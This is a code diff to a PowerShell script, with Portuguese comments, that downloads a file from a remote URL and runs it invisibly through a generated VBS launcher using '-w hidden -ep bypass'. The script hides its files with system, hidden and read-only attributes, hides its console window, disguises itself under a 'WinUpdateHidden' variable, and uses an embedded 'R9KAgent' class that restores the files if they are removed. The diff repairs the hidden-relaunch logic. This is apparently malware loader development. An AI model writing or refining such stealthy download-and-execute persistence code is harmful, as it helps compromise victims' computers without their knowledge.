@@ -23,7 +23,7 @@ $vbsPath = "$dir\$installName.vbs"
 New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
 try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
 
-$vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '"" -hidden", 0, False'
+$vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '""", 0, False'
 Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue
 
 attrib +h +s +r $scriptPath 2>$null
@@ -47,8 +47,8 @@ try {
 } catch {}
 
 # ===== ESCONDE E VAI PRO BACKGROUND =====
-# Se não tiver o argumento -hidden, ele se auto-esconde e passa pro VBS
-if ($args -notcontains "-hidden") {
+# Usa variável de ambiente para não conflitar com o parâmetro -hidden do PowerShell
+if (-not $env:WinUpdateHidden) {
     Add-Type -Name Window -Namespace Console -MemberDefinition '
     [DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
     [DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
@@ -56,6 +56,7 @@ if ($args -notcontains "-hidden") {
     $consolePtr = [Console.Window]::GetConsoleWindow()
     if ($consolePtr -ne [IntPtr]::Zero) { [Console.Window]::ShowWindow($consolePtr, 0) }
 
+    $env:WinUpdateHidden = "1"
     Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
     exit # Fecha essa janela e a execução continua invisível pelo VBS
 }
@@ -138,7 +139,7 @@ if (-not ("R9KAgent" -as [type])) {
                         File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                     }
                     if (!File.Exists(vbsPath)) {
-                        string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\" -hidden\", 0, False";
+                        string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\"\", 0, False";
                         File.WriteAllText(vbsPath, vbs);
                         File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                     }
